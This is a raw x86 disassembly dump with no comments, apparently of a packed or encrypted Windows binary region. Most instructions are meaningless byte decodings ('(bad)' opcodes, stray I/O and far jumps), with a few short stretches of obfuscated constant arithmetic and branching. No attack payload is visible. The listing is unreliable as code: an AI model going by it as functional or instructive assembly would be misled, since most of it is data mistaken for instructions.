  40719b:	imul   eax,DWORD PTR [ebp-0x66],0xffffffc1
  40719f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071a0:	ds aad 0x56
  4071a3:	xchg   edi,eax
  4071a4:	fwait
  4071a5:	sub    DWORD PTR [eax],0x63c05d64
  4071ab:	pop    ebp
  4071ac:	fldcw  WORD PTR [ebx]
  4071ae:	outs   dx,BYTE PTR ds:[esi]
  4071af:	loope  0x407199
  4071b1:	pop    es
  4071b2:	push   ebp
  4071b3:	jp     0x407222
  4071b5:	inc    eax
  4071b6:	or     al,0x48
  4071b8:	dec    esp
  4071b9:	popf   
  4071ba:	repz jle 0x4071c2
  4071bd:	fmul   st,st(6)
  4071bf:	fsub   DWORD PTR [eax+0x37063160]
  4071c5:	inc    edi
  4071c6:	mov    ecx,0x93ab580a
  4071cb:	dec    DWORD PTR [ecx]
  4071cd:	cli    
  4071ce:	in     al,dx
  4071cf:	pop    es
  4071d0:	imul   eax
  4071d2:	mov    ecx,DWORD PTR [eax+0x71afa18a]
  4071d8:	or     al,0x5a
  4071da:	repnz test BYTE PTR [ebp-0xf17b170],0x14
  4071e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071e3:	xchg   ebx,eax
  4071e4:	fistp  DWORD PTR [edx-0x1a7cc7a9]
  4071ea:	mov    bh,0xdd
  4071ec:	inc    eax
  4071ed:	popa   
  4071ee:	xchg   BYTE PTR [ecx+ebx*8],dh
  4071f1:	mov    WORD PTR [ebx],cs
  4071f3:	mov    ds:0xf684c5dd,al
  4071f8:	dec    ecx
  4071f9:	dec    ebx
  4071fa:	fisttp WORD PTR [edx]
  4071fc:	mov    dh,0xd7
  4071fe:	mov    ebx,0x8bdc092b
  407203:	adc    BYTE PTR [ecx+0x7e],ch
  407206:	loope  0x4071ef
  407208:	nop
  407209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40720a:	gs es sub eax,0x468cafdb
  407211:	pop    ebp
  407212:	(bad)  
  407213:	and    DWORD PTR [ebx+ecx*2],edx
  407216:	mov    ebp,0xd9b960f7
  40721b:	clc    
  40721c:	sub    eax,0x6193240d
  407221:	dec    ebx
  407222:	xchg   ebx,eax
  407223:	and    al,0xcd
  407225:	xrelease mov BYTE PTR [esi-0x10],cl
  407229:	mov    al,ds:0x55f7c3de
  40722e:	mov    dl,0xf7
  407230:	(bad)  
  407231:	aas    
  407232:	or     al,BYTE PTR [edx-0x20a298b7]
  407238:	clc    
  407239:	jnp    0x407265
  40723b:	inc    ebx
  40723c:	leave  
  40723d:	ror    DWORD PTR [esi-0x39],1
  407240:	scas   al,BYTE PTR es:[edi]
  407241:	idiv   DWORD PTR [esi+0x68552900]
  407247:	mov    dh,0xeb
  407249:	mov    ah,0x86
  40724b:	mov    DWORD PTR [ebp-0x2c],0x4f39
  407252:	mov    DWORD PTR ds:0x4345ef,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x4345df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434713,0x4345e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434607
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4345fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43464b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43463b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4346ef
  4072cc:	mov    eax,ds:0x434733
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x95907a48
  4072fa:	mov    eax,0xcf3f6777
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407324
  407306:	mov    al,ds:0xd8252893
  40730b:	mov    cl,0x4e
  40730d:	and    ecx,DWORD PTR [eax+0x5d37e21a]
  407313:	ins    BYTE PTR es:[edi],dx
  407314:	sub    DWORD PTR [edi],0x69c66df1
  40731a:	scas   eax,DWORD PTR es:[edi]
  40731b:	cmp    BYTE PTR [ebp-0x63],bl
  40731e:	jmp    0x47fa:0xeca9b209
  407325:	loope  0x407333
  407327:	aas    
  407328:	dec    edi
  407329:	bound  ebp,QWORD PTR [eax+0x73]
  40732c:	add    BYTE PTR [ecx+0x50b9d4b9],ah
  407332:	hlt    
  407333:	pop    ecx
  407334:	stos   BYTE PTR es:[edi],al
  407335:	enter  0xe1b5,0xa6
  407339:	cmp    cl,al
  40733b:	mov    edi,0x3b2b67f
  407340:	mov    edx,0x96c85bee
  407345:	mov    bl,0xdc
  407347:	out    0xca,al
  407349:	push   esp
  40734a:	xchg   ebx,eax
  40734b:	add    eax,esi
  40734d:	into   
  40734e:	into   
  40734f:	cmp    al,0x22
  407351:	pusha  
  407352:	daa    
  407353:	adc    dl,BYTE PTR [edx+ecx*8+0x5a]
  407357:	xor    DWORD PTR [esi+0x67],edi
  40735a:	push   ss
  40735b:	push   edx
  40735c:	repz dec esp
  40735e:	aam    0xbd
  407360:	test   BYTE PTR ds:0x337d3d52,bh
  407366:	imul   edx,DWORD PTR [eax+esi*1],0x1de14349
  40736d:	(bad)  
  40736e:	mov    edx,0x5c2bab8f
  407373:	in     eax,0x87
  407375:	xchg   edi,eax
  407376:	pop    ecx
  407377:	sbb    ah,BYTE PTR [edi+eiz*8-0x182781b7]
  40737e:	adc    eax,0xf34f32e0
  407383:	jo     0x407371
  407385:	scas   al,BYTE PTR es:[edi]
  407386:	push   es
  407387:	icebp  
  407388:	xor    eax,0x394448e
  40738d:	std    
  40738e:	jo     0x40737b
  407390:	clc    
  407391:	mov    eax,0x773854b7
  407396:	push   edi
  407397:	aas    
  407398:	push   es
  407399:	pop    edx
  40739a:	jb     0x407410
  40739c:	dec    ecx
  40739d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40739e:	test   BYTE PTR [eax+eax*2-0x2cfaf9d9],0x65
  4073a6:	cmp    dl,BYTE PTR [eax-0x64]
  4073a9:	and    BYTE PTR [eax+eax*2],cl
  4073ac:	punpcklwd mm0,DWORD PTR [ecx+0x678e8489]
  4073b3:	sub    ebp,DWORD PTR [ebx+0x3f66d5ea]
  4073b9:	jbe    0x407361
  4073bb:	lea    edi,[edi+0x2e19b1aa]
  4073c1:	inc    ebx
  4073c2:	xor    ah,BYTE PTR [esi+ebp*1+0x6699acb5]
  4073c9:	pop    esp
  4073ca:	fsubr  QWORD PTR [ecx]
  4073cc:	sbb    BYTE PTR [edi+0x12bb77f2],0x2b
  4073d3:	and    BYTE PTR [ecx],0xc
  4073d6:	mov    eax,0x498c0f72
  4073db:	adc    ebx,DWORD PTR ds:0xe4327cb0
  4073e1:	inc    ebx
  4073e2:	aas    
  4073e3:	sub    DWORD PTR [edi-0x39d22f67],edi
  4073e9:	inc    edx
  4073ea:	bound  ecx,QWORD PTR [edi+0x3c]
  4073ed:	in     eax,0xea
  4073ef:	sub    esi,edx
  4073f1:	cwde   
  4073f2:	in     eax,dx
  4073f3:	mov    ecx,0x1b37e684
  4073f8:	dec    eax
  4073f9:	or     BYTE PTR [edx-0x73],0xad
  4073fd:	mov    eax,0x60feefbf
  407402:	int    0xab
  407404:	adc    eax,0xfa7962b8
  407409:	retf   0x56b0
  40740c:	in     al,0x6b
  40740e:	xchg   esp,eax
  40740f:	sub    eax,0xe32f5eac
  407414:	cmp    ebx,DWORD PTR [esi+0x15369494]
  40741a:	push   ebx
  40741b:	push   esi
  40741c:	xchg   edx,eax
  40741d:	or     ch,bh
  40741f:	(bad)  
  407420:	div    BYTE PTR [eax+ebx*4]
  407423:	jmp    0x40745e
  407425:	adc    BYTE PTR [edx+0x10e117f8],ah
  40742b:	pop    edx
  40742c:	mul    ebx
  40742e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40742f:	test   al,0xc5
  407431:	cs int3 
  407433:	adc    DWORD PTR [ebx+0x1],0xffffffe3
  407437:	out    dx,al
  407438:	mov    dh,ch
  40743a:	popf   
  40743b:	stc    
  40743c:	into   
  40743d:	(bad)  
  40743e:	sbb    al,0x47
  407440:	std    
  407441:	daa    
  407442:	add    dh,BYTE PTR [ebx+0x239ac95]
  407448:	sahf   
  407449:	out    dx,al
  40744a:	fs stos BYTE PTR es:[edi],al
  40744c:	mov    bh,0x1c
  40744e:	imul   edi,DWORD PTR [ebx-0x10],0x2502fb62
  407455:	retf   0x61c4
  407458:	imul   eax,esp,0xffffffa8
  40745b:	call   0xb32e:0x97bb2703
  407462:	inc    ebx
  407463:	loopne 0x40749b
  407465:	cmp    BYTE PTR [eax],bl
  407467:	lods   eax,DWORD PTR ds:[esi]
  407468:	and    cl,BYTE PTR [ecx+0x471b1531]
  40746e:	pop    eax
  40746f:	test   DWORD PTR [ecx+0x74],ebp
  407472:	enter  0x689e,0x75
  407476:	or     DWORD PTR [ebx-0x44],0x72
  40747a:	stos   DWORD PTR es:[edi],eax
  40747b:	stos   BYTE PTR es:[edi],al
  40747c:	pop    es
  40747d:	or     al,0xe0
  40747f:	std    
  407480:	add    al,0xff
  407482:	es enter 0x6cab,0x39
  407487:	pop    ds
  407488:	xor    eax,0x4737236
  40748d:	inc    edx
  40748e:	and    al,0x1f
  407490:	pop    ebp
  407491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407492:	das    
  407493:	hlt    
  407494:	pop    edx
  407495:	push   ds
  407496:	xor    ebx,DWORD PTR [edi+0x13113143]
  40749c:	lds    ebx,FWORD PTR [eax-0x36]
  40749f:	mov    al,ds:0x628ff532
  4074a4:	xchg   esi,eax
  4074a5:	add    BYTE PTR [esi+ecx*4+0x51],bh
  4074a9:	lods   eax,DWORD PTR ds:[esi]
  4074aa:	and    edx,esp
  4074ac:	popf   
  4074ad:	mov    ah,BYTE PTR [ebp+0x3a2a1888]
  4074b3:	clc    
  4074b4:	das    
  4074b5:	les    edx,FWORD PTR [esi-0x59]
  4074b8:	dec    ebx
  4074b9:	mov    edi,DWORD PTR [ebx+eiz*4+0x6e]
  4074bd:	sar    ebx,cl
  4074bf:	icebp  
  4074c0:	pop    esp
  4074c1:	fucom  st(7)
  4074c3:	dec    esp
  4074c4:	jmp    0xb160:0x735ae2b4
  4074cb:	lods   eax,DWORD PTR ds:[esi]
  4074cc:	xchg   edi,eax
  4074cd:	adc    ebp,ebx
  4074cf:	cld    
  4074d0:	in     eax,dx
  4074d1:	fidivr WORD PTR [edx]
  4074d3:	sbb    al,0x5f
  4074d5:	sar    BYTE PTR ds:0xd296925b,1
  4074db:	xchg   esi,eax
  4074dc:	cmp    al,0xf3
  4074de:	mov    al,0x80
  4074e0:	push   es
  4074e1:	je     0x407503
  4074e3:	fsubr  DWORD PTR [edi-0x20877188]
  4074e9:	shl    BYTE PTR [ebx-0x37],cl
  4074ec:	stos   DWORD PTR es:[edi],eax
  4074ed:	pop    ss
  4074ee:	pop    ecx
  4074ef:	repnz cmc 
  4074f1:	cmp    BYTE PTR [eax-0x787e048a],bl
  4074f7:	call   0x82619c4e
  4074fc:	loopne 0x40750b
  4074fe:	in     al,0x3a
  407500:	mov    ebp,0x3146b60
  407505:	and    dh,ch
  407507:	not    DWORD PTR [esi-0x47]
  40750a:	enter  0xa3bd,0xf9
  40750e:	loopne 0x407512
  407510:	jae    0x407503
  407512:	in     al,0xcc
  407514:	(bad)  
  407515:	jbe    0x407509
  407517:	(bad)  
  407518:	in     al,dx
  407519:	mov    DWORD PTR [edx],ecx
  40751b:	mov    dh,0x7b
  40751d:	and    ebp,eax
  40751f:	cwde   
  407520:	add    DWORD PTR [edi+0x1a],0xa91ac3d4
  407527:	sub    cl,0x55
  40752a:	push   eax
  40752b:	out    dx,al
  40752c:	imul   edi,esi,0xcbeb1af2
  407532:	push   es
  407533:	lock retf 
  407535:	pop    esp
  407536:	push   ebp
  407537:	clc    
  407538:	lea    ecx,[ebx-0x1febebc0]
  40753e:	or     eax,0x37e75bef
  407543:	jns    0x40756e
  407545:	jecxz  0x4074f1
  407547:	inc    ecx
  407548:	fisttp DWORD PTR ds:0x19f038d4
  40754e:	xor    al,0x7
  407550:	fs stc 
  407552:	jle    0x40756b
  407554:	fadd   QWORD PTR [eax+eiz*8+0x55]
  407558:	inc    ebp
  407559:	xchg   DWORD PTR [eax],edx
  40755b:	jge    0x40756c
  40755d:	aam    0x25
  40755f:	xchg   ebx,eax
  407560:	jne    0x407529
  407562:	js     0x4075c4
  407564:	pop    esp
  407565:	pop    ebx
  407566:	pop    esi
  407567:	push   ecx
  407568:	inc    ebx
  407569:	outs   dx,DWORD PTR ds:[esi]
  40756a:	mov    ebp,0x41700e8
  40756f:	ret    
  407570:	mov    ecx,esi
  407572:	fmul   st,st(2)
  407574:	adc    eax,0xfc21daea
  407579:	mov    edx,0x9dc04434
  40757e:	loope  0x4075cf
  407580:	test   DWORD PTR ds:0x4ad34c49,esp
  407586:	jg     0x407586
  407588:	pop    edx
  407589:	push   esp
  40758a:	and    DWORD PTR [edi-0x3b7a7939],0xffffff93
  407591:	mov    cl,0x6
  407593:	icebp  
  407594:	loop   0x4075dc
  407596:	dec    eax
  407597:	je     0x40757a
  407599:	cmp    al,cl
  40759b:	addr16 pop ebx
  40759d:	jno    0x4075ec
  40759f:	int3   
  4075a0:	test   DWORD PTR [ebx+0x66],esi
  4075a3:	xor    eax,0x9aa20634
  4075a8:	hlt    
  4075a9:	mov    eax,DWORD PTR [edx+ebp*1+0x372a7745]
  4075b0:	cmp    eax,0xce6f123e
  4075b5:	sbb    BYTE PTR [esi],ah
  4075b7:	mov    esp,eax
  4075b9:	shl    DWORD PTR ds:0xcc5b7e34,1
  4075bf:	mov    ds,WORD PTR [ecx-0x60]
  4075c2:	sbb    eax,0xfe2cc744
  4075c7:	push   ecx
  4075c8:	pop    ds
  4075c9:	push   ds
  4075ca:	mov    eax,0x2671d12b
  4075cf:	and    cl,bl
  4075d1:	dec    esi
  4075d2:	es push esi
  4075d4:	cmp    ebp,DWORD PTR [esi]
  4075d6:	inc    ebx
  4075d7:	mov    bl,0x2e
  4075d9:	out    0xa4,eax
  4075db:	repnz sahf 
  4075dd:	stc    
  4075de:	out    0x1f,eax
  4075e0:	pop    ebx
  4075e1:	rol    BYTE PTR [edi-0x625898c6],cl
  4075e7:	add    ecx,esp
  4075e9:	dec    edi
  4075ea:	push   ds
  4075eb:	js     0x4075a2
  4075ed:	mov    ch,0xde
  4075ef:	into   
  4075f0:	sub    DWORD PTR [edi+eiz*4],eax
  4075f3:	outs   dx,BYTE PTR ds:[esi]
  4075f4:	aas    
  4075f5:	inc    esi
  4075f6:	js     0x4075b2
  4075f8:	xor    bl,bl
  4075fa:	retf   
  4075fb:	lods   eax,DWORD PTR ds:[esi]
  4075fd:	sbb    al,0x34
  4075ff:	xchg   BYTE PTR ds:0x8a62aa98,dh
  407605:	and    al,0xcd
  407607:	out    0xd3,al
  407609:	lods   al,BYTE PTR ds:[esi]
  40760a:	dec    edi
  40760b:	sbb    BYTE PTR [ebp+0x1a5e86da],bl
  407611:	or     cl,BYTE PTR [ebx+ebp*2-0x2fd3427a]
  407618:	sub    BYTE PTR [eax],ch
  40761a:	dec    ebx
  40761b:	sub    BYTE PTR [esi-0x6536dab6],ch
  407621:	xor    eax,0x19238127
  407626:	outs   dx,DWORD PTR ds:[esi]
  407627:	(bad)  
  407628:	(bad)  [edi]
  40762a:	into   
  40762b:	and    esi,ebx
  40762d:	int3   
  40762e:	adc    esp,DWORD PTR [ebp-0x63]
  407631:	adc    BYTE PTR [ecx-0x746e76f5],bh
  407637:	sahf   
  407638:	mov    DWORD PTR [ecx-0x173fc64f],ebp
  40763e:	or     DWORD PTR [ebx+0x7fd31bc5],edi
  407644:	and    al,0x5f
  407646:	jmp    0x4075cc
  407648:	ror    BYTE PTR [ecx],cl
  40764a:	dec    esp
  40764b:	mov    ebx,0x9802c8db
  407650:	mov    ebx,0x76d68b0
  407655:	loop   0x407618
  407657:	pop    edi
  407658:	or     eax,0xbd5ed3ec
  40765d:	in     al,0xe0
  40765f:	fistp  DWORD PTR [ebx+0x12]
  407662:	jmp    0x4075f5
  407664:	jne    0x4076c9
  407666:	fsubr  st,st(3)
  407668:	xchg   edi,eax
  407669:	jmp    DWORD PTR [edx+0x7a]
  40766c:	data16 or al,0x67
  40766f:	cmp    BYTE PTR [edx+0x6b],bl
  407672:	push   esp
  407673:	jbe    0x4076d5
  407675:	pop    ecx
  407676:	add    DWORD PTR [esi+ecx*8+0x7ccc7580],ebp
  40767d:	pop    edi
  40767e:	fdivr  st(5),st
  407680:	sbb    DWORD PTR [ebx+esi*2],ebp
  407683:	pop    esp
  407684:	sbb    bl,dl
  407686:	fbstp  TBYTE PTR [ecx]
  407688:	lea    edx,[eax-0x7b58a5d8]
  40768e:	xchg   esp,eax
  40768f:	adc    DWORD PTR [eax+0x680ad832],ecx
  407695:	or     al,0x6a
  407697:	leave  
  407698:	mov    ebx,0x333d2159
  40769d:	loop   0x407710
  40769f:	xchg   DWORD PTR [esi+0x1a5c7587],edi
  4076a5:	jmp    0x130f68da
  4076aa:	imul   esi,edx,0x15
  4076ad:	test   BYTE PTR [ecx+0x29],al
  4076b0:	(bad)  
  4076b1:	retf   0x6c0
  4076b4:	dec    ecx
  4076b5:	cmp    edi,DWORD PTR [ecx-0x5359921c]
  4076bb:	sub    esi,DWORD PTR [eax+0x6f93beb9]
  4076c1:	fwait
  4076c2:	add    BYTE PTR [edx-0x17],bh
  4076c5:	inc    edi
  4076c6:	push   ebp
  4076c7:	cmp    eax,0x59085e18
  4076cc:	cmp    DWORD PTR [ebx+ebp*2],0xffffffde
  4076d0:	in     eax,dx
  4076d1:	sbb    ecx,DWORD PTR [ebx+0x5bbb101e]
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x3df5953b
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x407749
  40772b:	cwde   
  40772c:	inc    esp
  40772d:	in     eax,dx
  40772e:	call   0x4346:0x9d5c17c1
  407735:	ja     0x4076df
  407737:	dec    eax
  407738:	test   BYTE PTR [edi-0x7b],0x4d
  40773c:	mov    ch,0x42
  40773e:	cdq    
  40773f:	sbb    bl,dh
  407741:	aaa    
  407742:	cmp    dh,ch
  407744:	das    
  407745:	cmp    esp,DWORD PTR [eax+ebx*8]
  407748:	sub    al,0x56
  40774a:	dec    edi
  40774b:	dec    eax
  40774c:	call   0xe93a:0x9ecdf1a2
  407753:	xor    al,bl
  407755:	push   esp
  407756:	fdiv   DWORD PTR [esi]
  407758:	push   eax
  407759:	shl    BYTE PTR [edi],1
  40775b:	dec    ecx
  40775c:	sub    cl,dl
  40775e:	mov    dh,0x7c
  407760:	push   ebp
  407761:	mov    edi,0x21583df5
  407766:	mov    bl,0xae
  407768:	and    bh,BYTE PTR [ebx]
  40776a:	pop    edx
  40776b:	les    ebx,FWORD PTR [ebx-0x19ce8255]
  407771:	test   DWORD PTR [esi+0x56],0xd5d7fe1a
  407778:	pop    ss
  407779:	fsubr  DWORD PTR [esi+ebx*4-0x25]
  40777d:	loopne 0x407794
  40777f:	jnp    0x407794
  407781:	ins    BYTE PTR es:[edi],dx
  407782:	daa    
  407783:	addr16 jmp 0x4077bf
  407786:	ret    0x85e
  407789:	gs mov edi,0x4633fc8a
  40778f:	add    eax,0x7bb925f9
  407794:	cwde   
  407795:	xchg   esi,eax
  407796:	ret    
  407797:	mov    dl,0x1c
  407799:	pop    esp
  40779a:	bnd jno 0x407792
  40779d:	test   DWORD PTR [ecx+0x775021bd],edx
  4077a3:	out    dx,eax
  4077a4:	ds out dx,al
  4077a6:	or     al,0x33
  4077a8:	xchg   DWORD PTR [esi+0x13bbb1fe],edi
  4077ae:	ror    edx,1
  4077b0:	popa   
  4077b1:	and    eax,0x99870e48
  4077b6:	inc    ebp
  4077b7:	inc    esi
  4077b8:	jmp    0xfe6e1e1c
  4077bd:	mov    ds:0xaa5e27f,al
  4077c2:	xchg   ebx,eax
  4077c3:	mov    ebx,0x4f2fcbf4
  4077c8:	(bad)  
  4077c9:	dec    esi
  4077ca:	jbe    0x407826
  4077cc:	sub    al,0x93
  4077ce:	jge    0x4077f3
  4077d0:	jecxz  0x407796
  4077d2:	mov    es,WORD PTR [edx-0x1d2c2450]
  4077d8:	push   es
  4077d9:	cwde   
  4077da:	(bad)  
  4077db:	jecxz  0x407819
  4077dd:	inc    esp
  4077df:	iret   
  4077e0:	sbb    DWORD PTR [ebp+0x1],esi
  4077e3:	(bad)  
  4077e4:	jl     0x407783
  4077e6:	shl    BYTE PTR [ebx],cl
  4077e8:	les    esp,FWORD PTR [edx]
  4077ea:	cmp    DWORD PTR [eax+0x193027da],edi
  4077f0:	mov    edx,0x3a9daa04
  4077f5:	mov    ch,0x39
  4077f7:	cwde   
  4077f8:	les    ebp,FWORD PTR [ebp-0x29]
  4077fb:	test   al,0xc
  4077fd:	daa    
  4077fe:	int3   
  4077ff:	adc    DWORD PTR [esi+0x11],esp
  407802:	or     BYTE PTR cs:[eax],ch
  407805:	ficom  WORD PTR [ebx-0x253dd139]
  40780b:	sub    al,0x6
  40780d:	pop    esi
  40780e:	not    BYTE PTR [ebx]
  407810:	into   
  407811:	neg    DWORD PTR [edx]
  407813:	stc    
  407814:	dec    edi
  407815:	out    dx,al
  407816:	sti    
  407817:	mov    ds:0xd8b8df7,al
  40781c:	idiv   BYTE PTR [ecx]
  40781e:	mov    ds:0xce72c278,eax
  407823:	pop    ebp
  407824:	js     0x407897
  407826:	dec    esp
  407827:	cmp    ecx,edx
  407829:	jg     0x407861
  40782b:	iret   
  40782c:	in     eax,0x36
  40782e:	fistp  DWORD PTR [esi-0x70]
  407831:	sbb    eax,0xb7471a5b
  407836:	push   ebx
  407837:	call   FWORD PTR [esi+0x7b22d5b4]
  40783d:	ret    
  40783e:	jge    0x4078ba
  407840:	pop    eax
  407841:	mov    ecx,0xe2af10e6
  407846:	inc    ebp
  407847:	test   DWORD PTR [ebp-0x7c9c0b03],0x8e56577e
  407851:	div    BYTE PTR [edx+ecx*2]
  407854:	mov    ah,0x2a
  407856:	(bad)  
  407857:	popa   
  407858:	adc    ecx,DWORD PTR [ebp+0x72e8c1e]
  40785e:	add    dl,BYTE PTR [ebp+0x3f61dac7]
  407864:	test   eax,0xf4b53eb8
  407869:	(bad)  
  40786a:	jg     0x40781f
  40786c:	ja     0x407819
  40786e:	pop    edx
  40786f:	mov    esp,0x9746188e
  407874:	cmc    
  407875:	fxch   st(3)
  407877:	cmp    dl,cl
  407879:	scas   eax,DWORD PTR es:[edi]
  40787a:	ror    DWORD PTR [eax+0x10707e18],0x7f
  407881:	or     eax,0x8c7698a8
  407886:	jb     0x4078d9
  407888:	dec    esp
  407889:	xchg   edx,eax
  40788a:	dec    esp
  40788b:	jmp    0xebda:0xa6c99edb
  407892:	jnp    0x4078f7
  407894:	aaa    
  407895:	(bad)  
  407896:	icebp  
  407897:	out    0x52,eax
  407899:	cli    
  40789a:	push   esp
  40789b:	rol    dl,1
  40789d:	cmp    ebx,DWORD PTR [ebx+0x6e0c0673]
  4078a3:	dec    edi
  4078a4:	cmp    ah,ah
  4078a6:	push   esi
  4078a7:	into   
  4078a8:	pop    edi
  4078a9:	cmp    al,0x47
  4078ab:	pop    edx
  4078ac:	cwde   
  4078ad:	std    
  4078ae:	int    0x10
  4078b0:	push   eax
  4078b1:	jns    0x4078c8
  4078b3:	cmp    BYTE PTR [eax+eax*1-0x73],ch
  4078b7:	lahf   
  4078b8:	push   ecx
  4078b9:	cwde   
  4078ba:	inc    esi
  4078bb:	sub    dl,BYTE PTR [ebp-0x73]
  4078be:	xor    DWORD PTR [edx],edx
  4078c0:	shr    ebx,0x6b
  4078c3:	enter  0x573c,0x89
  4078c7:	ret    
  4078c8:	cmc    
  4078c9:	mov    ds:0x1ba6a38b,al
  4078ce:	stos   DWORD PTR es:[edi],eax
  4078cf:	nop
  4078d0:	int    0xb7
  4078d2:	arpl   bx,bp
  4078d4:	icebp  
  4078d5:	sar    DWORD PTR [esp+ecx*1+0x41],cl
  4078d9:	(bad)  
  4078da:	jbe    0x407921
  4078dc:	mov    dl,0x6d
  4078de:	push   0xd
  4078e0:	sub    BYTE PTR [ebx+edx*8+0x11],ch
  4078e4:	sbb    al,0xad
  4078e6:	lea    ecx,[eax-0x28]
  4078e9:	pusha  
  4078ea:	sti    
  4078eb:	sbb    ah,BYTE PTR [esi-0x79]
  4078ee:	ret    0xdc64
  4078f1:	scas   eax,DWORD PTR es:[edi]
  4078f2:	push   ebp
  4078f3:	addr16 mov bl,0x21
  4078f6:	xchg   edi,eax
  4078f7:	and    ecx,eax
  4078f9:	rcl    BYTE PTR [ecx-0x35],1
  4078fc:	das    
  4078fd:	jg     0x407895
  4078ff:	mov    ?,WORD PTR [esi+0x61c9b654]
  407905:	and    al,BYTE PTR [esi+0x46865280]
  40790b:	in     al,dx
  40790c:	inc    DWORD PTR [ebx]
  40790e:	daa    
  40790f:	out    0xce,eax
  407911:	and    al,0x3e
  407913:	mov    DWORD PTR [ecx+esi*8],esi
  407916:	cmp    BYTE PTR [esi+0x2],bl
  407919:	sahf   
  40791a:	cdq    
  40791b:	and    eax,0x3914e354
  407920:	push   esp
  407921:	xchg   ebp,eax
  407922:	cld    
  407923:	adc    al,0xb
  407925:	repz aaa 
  407927:	and    BYTE PTR [esi+0x13],dl
  40792a:	retf   0xb8ee
  40792d:	fist   WORD PTR [eax]
  40792f:	sbb    dl,0x8f
  407932:	mul    DWORD PTR [ecx+0x5fbbaa62]
  407938:	mov    esp,0xaf9ba175
  40793d:	shl    DWORD PTR [ebp+0x20be55cc],1
  407943:	inc    eax
  407944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407945:	pop    ebp
  407946:	mov    ah,0x9b
  407948:	pop    eax
  407949:	test   DWORD PTR [ecx-0x47bcf321],edx
  40794f:	ja     0x4079cc
  407951:	adc    DWORD PTR [edx],0x5e4d72b4
  407957:	pop    ss
  407958:	outs   dx,WORD PTR ds:[esi]
  40795a:	aad    0x57
  40795c:	xor    cl,al
  40795e:	push   0x6e
  407960:	xchg   ebx,eax
  407961:	jne    0x407933
  407963:	test   BYTE PTR es:[esi+0x209e968c],al
  40796a:	les    eax,FWORD PTR es:[ebp-0x54f2d997]
  407971:	not    DWORD PTR [ebx]
  407973:	sub    eax,0x38052c0d
  407978:	cli    
  407979:	nop
  40797a:	es jbe 0x4079f3
  40797d:	stos   DWORD PTR es:[edi],eax
  40797e:	bound  esp,QWORD PTR [edx]
  407980:	hlt    
  407981:	fisubr DWORD PTR [ebp-0x5cae330f]
  407987:	or     DWORD PTR [edx+0x5bd6c7e4],edi
  40798d:	or     BYTE PTR [ebp+0x332b3ccb],ah
  407993:	cwde   
  407994:	test   DWORD PTR [edx+0x11],ebx
  407997:	mov    bh,0x76
  407999:	pop    ebx
  40799a:	jp     0x40795b
  40799c:	jb     0x40797a
  40799e:	leave  
  40799f:	jge    0x4079df
  4079a1:	mov    WORD PTR [ebp+0x26],cs
  4079a4:	lahf   
  4079a5:	sbb    BYTE PTR [ebx-0x2b69aaac],ch
  4079ab:	jecxz  0x407965
  4079ad:	push   0x5ddc3080
  4079b2:	sbb    DWORD PTR gs:[esi],ebx
  4079b5:	call   0xe7752940
  4079ba:	or     al,0xd3
  4079bc:	pop    es
  4079bd:	imul   eax,DWORD PTR [ebp-0x3c],0x68
  4079c1:	(bad)  
  4079c3:	xchg   esi,eax
  4079c4:	jno    0x407a1b
  4079c6:	inc    edi
  4079c7:	sbb    eax,0x56dae8a0
  4079cc:	mov    eax,ds:0x892007d9
  4079d1:	mov    ?,WORD PTR [ebp+esi*8+0x72]
  4079d5:	mov    eax,ds:0x7590ca3b
  4079da:	in     eax,dx
  4079db:	test   DWORD PTR [ebx],edx
  4079dd:	dec    esi
  4079de:	(bad)  
  4079e0:	dec    edx
  4079e1:	std    
